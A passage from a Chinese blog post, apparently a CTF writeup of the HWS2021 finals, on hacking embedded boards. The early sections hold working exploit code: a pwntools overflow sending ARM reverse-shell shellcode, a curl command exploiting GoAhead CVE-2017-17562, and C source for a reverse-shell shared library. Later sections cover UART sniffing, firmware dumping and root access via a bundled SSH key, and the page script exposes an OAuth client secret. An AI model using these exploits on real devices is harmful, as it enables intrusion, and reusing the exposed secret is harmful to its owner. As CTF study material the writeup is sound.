<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">p &#x3D; remote(&quot;20.21.2.27&quot;, 5000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode &#x3D; &quot;\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x02\x20\x42\xe0\xc8\x70\xa0\xe3\x51\x70\x87\xe2\x00\x00\x00\xef\x00\x40\xa0\xe1\x64\x10\x8f\xe2\x01\x20\xc1\xe5\x10\x20\xa0\xe3\x02\x70\x87\xe2\x00\x00\x00\xef\x3f\x70\xa0\xe3\x04\x00\xa0\xe1\x01\x10\x41\xe0\x00\x00\x00\xef\x04\x00\xa0\xe1\x01\x10\xa0\xe3\x00\x00\x00\xef\x04\x00\xa0\xe1\x02\x10\xa0\xe3\x00\x00\x00\xef\x30\x00\x8f\xe2\x02\x20\x42\xe0\x00\x10\xa0\xe1\x05\x10\x81\xe2\x00\x60\xa0\xe1\x80\x60\x86\xe2\x00\x10\x86\xe5\x04\x20\x86\xe5\x06\x10\xa0\xe1\x07\x20\xc0\xe5\x0b\x70\xa0\xe3\x00\x00\x00\xef\x02\xff\x11\x5c\x14\x15\x02\x1a\x2f\x62\x69\x6e\x2f\x73\x68\x00&quot;</span><br><span class="line"></span><br><span class="line">sc &#x3D; shellcode</span><br><span class="line"></span><br><span class="line">payload &#x3D; &quot;POST \r\n\r\nname&#x3D;root&amp;a&#x3D;&quot;</span><br><span class="line">payload &#x3D; payload + cyclic(788) + p32(0x000224F8 + 0x330)</span><br><span class="line">payload &#x3D; payload.ljust(0x330, &#39;\x00&#39;)</span><br><span class="line">payload &#x3D; payload + sc</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><img src="https://hackmd.summershrimp.com/uploads/upload_42d69f88a4cb49a073cc45142f1b24b1.png"></p>
<h2 id="webcamera"><a href="#webcamera" class="headerlink" title="webcamera"></a>webcamera</h2><p>goahead 2.5.0 CVE-2017-17562<br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4e803d6f19a3">https://www.jianshu.com/p/4e803d6f19a3</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6407">https://xz.aliyun.com/t/6407</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://192.168.8.108/cgi-bin/upload_conf.cgi?LD_PRELOAD=/proc/self/fd/0&quot; \</span><br><span class="line">-X POST --data-binary @evil_final.so -i</span><br></pre></td></tr></table></figure>



<p>eval.so  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *server_ip = <span class="string">&quot;127.000.000.001&quot;</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> server_port = <span class="number">7777</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reverse_shell</span><span class="params">(<span class="keyword">void</span>)</span> __<span class="title">attribute__</span><span class="params">((constructor))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reverse_shell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//socket initialize</span></span><br><span class="line">    <span class="keyword">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">attacker_addr</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    attacker_addr.sin_family = AF_INET;</span><br><span class="line">    attacker_addr.sin_port = htons(server_port);</span><br><span class="line">    attacker_addr.sin_addr.s_addr = inet_addr(server_ip);</span><br><span class="line">    <span class="comment">//connect to the server</span></span><br><span class="line">    <span class="keyword">if</span> (connect(sock, (struct sockaddr *)&amp;attacker_addr, <span class="keyword">sizeof</span>(attacker_addr)) != <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//dup the socket to stdin, stdout and stderr</span></span><br><span class="line">    dup2(sock, <span class="number">0</span>);</span><br><span class="line">    dup2(sock, <span class="number">1</span>);</span><br><span class="line">    dup2(sock, <span class="number">2</span>);</span><br><span class="line">    <span class="comment">//execute /bin/sh to get a shell</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *arggv[] = &#123;<span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, arggv, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> <img src="https://hackmd.summershrimp.com/uploads/upload_23c71b8cd7a1aafa727b44b71164ed44.png"></p>
<h2 id="brokenUart"><a href="#brokenUart" class="headerlink" title="brokenUart"></a>brokenUart</h2><p>通过strace对二进制分析得知，程序会往/dev/ttyS2 写入flag<br><img src="https://hackmd.summershrimp.com/uploads/upload_73c139a3610b4ba4765f19e847000947.png"></p>
<p>dump固件中的dtb得知系统有三个uart 端口</p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_004a15dec488488acc236024e472f078.png"></p>
<p>uart2端口对应ttys2，引脚是PE7 PE8</p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_9d6994fcaa64b1c0edadd1d076765745.png"></p>
<p>根据f1c的datasheet找到PE7  8  搭线后使用波特率9600的uart转串口从硬件截获flag</p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_d59fecd902033bc6cac3c174d682bddc.png"></p>
<p>搭线方法可以直接使用镊子一段杜邦线连接USB转TTL串口模块的RX引脚，另一端直接往SOC的对应引脚上戳。</p>
<h3 id="本题华点-1"><a href="#本题华点-1" class="headerlink" title="本题华点"></a>本题华点</h3><p>华点：<code>echo xxx &gt; /dev/ttyXXX</code>是用默认9600的波特率</p>
<h2 id="keygame"><a href="#keygame" class="headerlink" title="keygame"></a>keygame</h2><p>在按键的高电平侧搭线到atmega开发板的gpio上，gpio间歇拉低电平，自动触发按键。<br>图示：<br><img src="https://hackmd.summershrimp.com/uploads/upload_fea10ac8d4aca0dd830bfcf70b4c12b3.png"><br><img src="https://hackmd.summershrimp.com/uploads/upload_1c5accd8b6e8d071b27c5d03997a3d26.png"><br><img src="https://hackmd.summershrimp.com/uploads/upload_86eca8d38febee74ba7572442f62485c.png"><br><img src="https://hackmd.summershrimp.com/uploads/upload_cb536e08fc450a2904832a7f80a27287.png"></p>
<p>arduino 代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">void setup() &#123;</span><br><span class="line">  &#x2F;&#x2F; put your setup code here, to run once:</span><br><span class="line"></span><br><span class="line">  pinMode(8, OUTPUT);</span><br><span class="line">  pinMode(9, OUTPUT);</span><br><span class="line">  pinMode(10, OUTPUT);</span><br><span class="line">  Serial.begin(9600);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void loop() &#123;</span><br><span class="line">  while(1) &#123;</span><br><span class="line">  digitalWrite(8, LOW);</span><br><span class="line">  delay(10);</span><br><span class="line">  digitalWrite(8, HIGH);</span><br><span class="line">  delay(5);</span><br><span class="line">  digitalWrite(9, LOW);</span><br><span class="line">  delay(10);</span><br><span class="line">  digitalWrite(9, HIGH);</span><br><span class="line">  delay(5);</span><br><span class="line">  digitalWrite(10, LOW);</span><br><span class="line">  delay(10);</span><br><span class="line">  digitalWrite(10, HIGH);</span><br><span class="line">  delay(5);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="本题华点-2"><a href="#本题华点-2" class="headerlink" title="本题华点"></a>本题华点</h3><p>通过手册+dts数据可以得知，这个3按键不是使用的三个独立的GPIO，二是是使用的LRADC(模数转换器)，按下不同的按键，LRADC引脚获得不同的分压，内核来判断不同按键。</p>
<p>理论上也可以拆掉lradc的外围电路，用信号发生器打一个0v-3v 500hz的正弦波，效果应该会更好，接线也更少。但现场设备不足，就没法验证这个思路了。</p>
<p>PS：赛后和其他队伍讨论，有的队伍说把三个按键的高电平侧焊接到一起，然后同时拉高拉低也可以过这个题，我认为是不行的。感觉就算真的可以，大概率是虚焊了，导线自己抖啊抖，抖到了对应按键。</p>
<h2 id="其他华点"><a href="#其他华点" class="headerlink" title="其他华点"></a>其他华点</h2><h3 id="刷机工具"><a href="#刷机工具" class="headerlink" title="刷机工具"></a>刷机工具</h3><p>拿到单板之后一定要分析和单板相关的刷机工具，尤其是其中有没有Upload功能可以用来dump固件。本题的板子提供了sunxi-fel和dfu-util。其中sunxi-fel是allwinner的救砖模式刷机工具，dfu-util是uboot模式下的刷机工具。由于该单板使用的是spi-nand闪存，经过测试，sunxi-fel不支持对其完整编程，只能刷掉开头的uboot-spl部分。因此我们尝试使用dfu-util。</p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_dd2485f7ea2eb785faffcc29312a9107.png"></p>
<p>很明显，这工具支持upload，拿单板试一下，也确实可以。<br>因此通过<code>.\dfu-util.exe -l</code> 可以列出所有分区 (板子收回去了，印象里有u-boot, kernel.itb, rom, vendor) 四个。<br>通过<code>.\dfu-util.exe -U xxx.bin -a $part</code>就可以dump对应的分区到上位机。</p>
<p>拿到rom.bin之后，就可以解包出来rootfs，方便调试了。</p>
<h3 id="提取DTB获取devicetree"><a href="#提取DTB获取devicetree" class="headerlink" title="提取DTB获取devicetree"></a>提取DTB获取devicetree</h3><p>arm linux内核目前基本都使用device tree来识别硬件设备了。device tree就类似于x86上的acpi table。<br>本次比赛的单板使用了uboot FitImage将 dtb和bImage打包到了一起。<br>FitImage也是一个device tree文件 只不过其中包含了kernel和真正的dtb<br><img src="https://hackmd.summershrimp.com/uploads/upload_9ff35224020cd2672a423eb059c57c8d.png"></p>
<p>通过dtc对FitImage反编译，即可获得kernel和真正的dtb<br><img src="https://hackmd.summershrimp.com/uploads/upload_ebf83237acdfd707f802eadbf8796e7b.png"></p>
<p>当然，这里实际的数据都是用hexdump的形式表示的，我们只需要在hex编辑器中搜索一下开头的十几个字节，即可定位到dtb真正的位置并提取。</p>
<p>提取后再次使用dtc反编译，即可获得dts。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dtc -I dtb -O dts root.dtb</span><br></pre></td></tr></table></figure>
<blockquote>
<p>dtb: device tree blob , 设备树的二进制储存格式<br>dts: device tree string , 设备树的字符串储存格式</p>
</blockquote>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_f7d42928df16613314035ef354055b4b.png"></p>
<h3 id="如何获取单板root权限方便调试"><a href="#如何获取单板root权限方便调试" class="headerlink" title="如何获取单板root权限方便调试"></a>如何获取单板root权限方便调试</h3><p>解包rom分区后可以看到/root/.ssh 目录下面有<br><img src="https://hackmd.summershrimp.com/uploads/upload_1ec5aa3dccf0b58ea7186d52c266526f.png"><br>分析可发现其一一对应。因此直接通过这个id_rsa就可以进入ssh。<br><img src="https://hackmd.summershrimp.com/uploads/upload_4780e6fc4c9d0e278cfeb71f893f4948.png"></p>
<p>但是我们在比赛的时候没发现这一点。。。。用了一个比较奇葩的方法</p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_576eee6f38773362b9d99026b1c3b78e.png"></p>
<p>分析解包后的rootfs，可以发现其挂在了vendor分区，并执行了其中的start.sh<br>于是我们自己做了一个vendor分区镜像，刷了进去，在镜像中bind mount 了/root文件夹。<br>顺便还用buildroot编译了一个gdb和socat进去。。。</p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_4ec5ae51d0d3042e8f53e1d71d7c9701.png"></p>
<p><img src="https://hackmd.summershrimp.com/uploads/upload_19275b585d7e672cf438bddde1fb93ff.png"></p>
<p>用mkfs.jffs2来制作刷机包。但是我们也一直没找到正确的erase size和block size。刷机进去后大文件都是乱码的。但幸好authorized_keys是正确的，因此可以用自己的key，ssh连进去了。</p>
<h3 id="关于侧信道开发板"><a href="#关于侧信道开发板" class="headerlink" title="关于侧信道开发板"></a>关于侧信道开发板</h3><p>这玩意一看芯片型号是atmega2560 就很明显可以通过arduino方便的开发自己的程序实现某些功能了。因为arduino mega就是用的这块主控。</p>

<div id="gitalk-container"></div>
<script src="//cdn.jsdelivr.net/npm/blueimp-md5@2.18.0/js/md5.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.css"><script src="//cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js"></script>

        <script>
        var post_title = "HWS2021决赛WriteUp";
        var gitalkConfig = {"enable":true,"clientID":"c52007e74a2d1a984cf2","clientSecret":"7b7b53b4b0bb4bb59c137824b316b351d2305edc","repo":"summershrimp.github.io","owner":"summershrimp","admin":["summershrimp"],"labels":["gitalk"],"perPage":10,"pagerDirection":"last","createIssueManually":true,"distractionFreeMode":false,"proxy":"https://cors.xm1994.workers.dev/?https://github.com/login/oauth/access_token"};
        gitalkConfig.id = md5(post_title);
        var gitalk = new Gitalk(gitalkConfig);
        gitalk.render("gitalk-container");
        </script>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://www.summershrimp.com/2021/03/HWS2021%E5%86%B3%E8%B5%9BWriteUp/" data-id="clilsxe5v001nd0oqbyhp573l" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WriteUP/" rel="tag">WriteUP</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
  
    <a href="/2018/08/run-multi-service-in-one-container/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">如何科学的在Docker Container中运行多个服务</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/App/">App</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/App/%E5%AE%89%E5%85%A8%E5%90%91/">安全向</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Fun/">Fun</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Fun/%E5%BC%80%E5%8F%91%E5%90%91/">开发向</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Server-Side/">Server-Side</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Server-Side/Windows-Linux/">Windows/Linux</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web-Backend/">Web Backend</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Writeup/">Writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%90%90%E5%98%88/">吐嘈</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%90%90%E5%98%88/%E6%97%A5%E5%B8%B8/">日常</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%97%A5%E5%B8%B8/">日常</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9C%AA%E5%88%86%E7%B1%BB/">未分类</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B/">社会工程</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Apache/" rel="tag">Apache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CGI/" rel="tag">CGI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WriteUP/" rel="tag">WriteUP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%B0%E5%BC%80%E5%A7%8B/" rel="tag">新开始</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%97%A5%E5%B8%B8/" rel="tag">日常</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" rel="tag">服务器</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/Apache/" style="font-size: 10px;">Apache</a> <a href="/tags/CGI/" style="font-size: 10px;">CGI</a> <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/WriteUP/" style="font-size: 10px;">WriteUP</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 10px;">安全</a> <a href="/tags/%E6%96%B0%E5%BC%80%E5%A7%8B/" style="font-size: 10px;">新开始</a> <a href="/tags/%E6%97%A5%E5%B8%B8/" style="font-size: 10px;">日常</a> <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="font-size: 10px;">服务器</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/04/">April 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/02/">February 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/01/">January 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2014/12/">December 2014</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/03/HWS2021%E5%86%B3%E8%B5%9BWriteUp/">HWS2021决赛WriteUp</a>
          </li>
        
          <li>
            <a href="/2018/08/run-multi-service-in-one-container/">如何科学的在Docker Container中运行多个服务</a>
          </li>
        
          <li>
            <a href="/2018/05/xinetd-kafel/">xinetd-kafel - 一个更安全的xinetd服务</a>
          </li>
        
          <li>
            <a href="/2017/08/xman2017-awd-babyblog-writeup/">XMan2017夏令营结业攻防赛Babyblog出题思路 &amp; WriteUP</a>
          </li>
        
          <li>
            <a href="/2016/08/appium-android-ui-test/">Appium在Android UI测试中的应用</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2023 Yibai Zhang<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a><br>
      <a href="https://beian.miit.gov.cn/" target="_blank">鲁ICP备15035817号-1</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>